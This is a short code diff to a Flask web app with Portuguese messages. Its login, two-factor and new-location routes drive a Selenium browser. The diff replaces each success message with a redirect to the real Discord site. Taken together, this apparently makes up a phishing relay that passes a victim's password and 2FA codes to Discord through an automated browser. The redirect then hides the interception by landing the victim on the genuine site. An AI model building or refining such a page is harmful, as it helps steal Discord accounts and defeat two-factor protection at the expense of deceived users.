@@ -105,7 +105,7 @@ def login():
         else:
             # Login successful
             driver.quit()
-            return render_template('login.html', success="Login realizado com sucesso!")
+            return redirect("https://discord.com/channels/@me")
             
     except TimeoutException:
         if driver:
@@ -155,7 +155,7 @@ def verify_2fa():
         else:
             # Success
             driver.quit()
-            return render_template('login.html', success="Login com 2FA realizado com sucesso!")
+            return redirect("https://discord.com/channels/@me")
             
     except Exception as e:
         return render_template('login.html', show_2fa=True, error=f"Erro durante a verificação 2FA: {str(e)}", username=session.get('username'))
@@ -205,7 +205,7 @@ def verify_new_location():
         else:
             # Success
             driver.quit()
-            return render_template('login.html', success="Verificação de novo local realizada com sucesso!")
+            return redirect("https://discord.com/channels/@me")
             
     except Exception as e:
         return render_template('login.html', show_new_location=True, error=f"Erro durante a verificação: {str(e)}", username=session.get('username'))
